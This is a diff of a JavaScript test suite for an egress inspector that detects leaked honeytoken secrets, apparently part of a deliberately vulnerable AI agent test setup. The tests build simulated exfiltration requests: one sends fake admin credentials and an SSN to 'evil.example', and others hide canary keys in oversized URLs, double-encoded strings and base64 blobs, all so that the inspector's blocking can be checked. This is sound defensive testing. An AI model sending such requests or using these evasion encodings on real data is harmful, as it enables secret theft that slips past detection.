@@ -8,9 +8,10 @@ import {
   inspectEgress, loadHoneytokens, makeAllowlist, decodedViews, REASON_CODES, DEFAULTS,
 } from '../policy.mjs';
 import { validateAlert } from '../../alerts/schema.js';
+import { defaultHoneytokens } from '../inspector.mjs';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
-const RAW_TOKENS = JSON.parse(fs.readFileSync(path.join(HERE, '..', 'honeytokens.json'), 'utf8'));
+const RAW_TOKENS = defaultHoneytokens();
 const HT = loadHoneytokens(RAW_TOKENS);
 const STATIC = new Set(Object.values(REASON_CODES));
 const cfg = (mode = 'block', allow = ['canary']) => ({ mode, allow: makeAllowlist(allow), honeytokens: HT });
@@ -44,12 +45,12 @@ test('reasons are static codes only; alerts are valid T4 alerts with direction e
   const v = inspectEgress(http('http://evil.example:9/api/canary/exfil-test?data=Admin%20credentials%3A%20dvaa-admin-secret%20%7C%20SSN%3A%20123-45-6789'), cfg('block', []));
   assert.equal(v.direction, 'egress');
   assert.equal(v.detector, 'sentinel-egress');
-  assert.deepEqual(v.reasons.sort(), ['destination_not_allowlisted', 'honeytoken_match']);
+  assert.deepEqual(v.reasons.sort(), ['destination_not_allowlisted', 'honeytoken_match', 'secret_pattern_match']);
   for (const r of v.reasons) assert.ok(STATIC.has(r) && !r.includes(':'), r);
   assert.deepEqual(validateAlert(v.alertDoc), []);
   assert.equal(v.alertDoc.DetectName, 'HoneytokenExfiltrationAttempt');
   assert.equal(v.alertDoc.PatternDispositionDescription, 'Blocked');
-  assert.equal(v.alertDoc.Canary.Id, 'dvaa.admin_password');
+  assert.equal(v.alertDoc.Canary.Id, 'DVAA-ADMIN-PASSWORD');
   assert.ok(!JSON.stringify(v.alertDoc).includes('data='), 'query string never copied into the alert');
   noSecrets(v);
 });
@@ -85,7 +86,7 @@ test('data-rich: 300-row tool output with one honeytoken row at 287 is caught; c
   assert.equal(inspectEgress(http('http://canary:8080/rows', rows.join('\n')), cfg()).flagged, false);
   rows[287] = '287,Jane Smith,jane@example.com,987-65-4321';
   const v = inspectEgress(http('http://canary:8080/rows', rows.join('\n')), cfg());
-  assert.deepEqual(v.canaryIds, ['dvaa.pii_ssn_jane']);
+  assert.deepEqual(v.canaryIds, ['DVAA-SSN-JANE']);
   assert.equal(v.action, 'deny');
 });
 
@@ -93,7 +94,7 @@ test('data-rich: 20 KiB URL (over Node\'s 16 KiB default header limit) with the 
   const url = 'http://canary:8080/' + 'p'.repeat(20000) + '/api/canary/exfil-test?data=sk-ant-dvaa-test-anthropic-key-67890';
   assert.ok(url.length > 16384 && url.indexOf('sk-ant') > 16384);
   const v = inspectEgress(http(url), cfg());
-  assert.deepEqual(v.canaryIds, ['dvaa.anthropic_key']);
+  assert.deepEqual(v.canaryIds, ['DVAA-ANTHROPIC-KEY']);
 });
 
 test('fail-closed: over-cap payload denies in OBSERVE mode, is never scanned partially, and alerts loudly', () => {
@@ -135,15 +136,29 @@ test('#12 gap: double-%-encoded and \\u-escaped canaries in a URL query are caug
   };
   for (const [name, f] of Object.entries(forms)) {
     const v = inspectEgress(http(`http://canary:8080/x?q=hello&d=${f}&z=1`), cfg('block'));
-    assert.deepEqual(v.reasons, ['honeytoken_match'], name);
-    assert.deepEqual(v.canaryIds, ['dvaa.openai_key'], name);
+    assert.ok(v.reasons.includes('honeytoken_match'), name);
+    assert.deepEqual(v.canaryIds, ['DVAA-OPENAI-KEY'], name);
     assert.equal(v.action, 'deny', name);
     noSecrets(v);
   }
 });
 
+test('#18 review (2): canary inside a larger base64 blob is caught at every byte offset (0, 1, 2)', () => {
+  for (const tok of ['dvaa-admin-secret', 'sk-dvaa-openai-test-key-do-not-use-in-production-12345']) {
+    for (let off = 0; off < 3; off++) {
+      const blob = Buffer.from('P'.repeat(off) + 'report rows: ' + 'r,'.repeat(200) + tok + ' end of export').toString('base64');
+      for (const where of [`?d=${blob}`, `?d=${encodeURIComponent(blob)}`]) {
+        const v = inspectEgress(http(`http://canary:8080/x${where}`), cfg('block'));
+        assert.ok(v.reasons.includes('honeytoken_match'), `offset ${off} ${where.slice(0, 12)}`);
+      }
+      const b = inspectEgress(http('http://canary:8080/x', JSON.stringify({ attachment: blob })), cfg('block'));
+      assert.ok(b.reasons.includes('honeytoken_match'), `body offset ${off}`);
+    }
+  }
+});
+
 test('generic secret patterns are evidence only (never deny allowlisted traffic on their own)', () => {
-  const v = inspectEgress(http('http://canary:8080/x?k=ghp_' + 'a'.repeat(36)), cfg());
+  const v = inspectEgress(http('http://canary:8080/x?k=ghp_' + 'aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6'), cfg());
   assert.deepEqual(v.reasons, ['secret_pattern_match']);
   assert.equal(v.action, 'forward');
 });
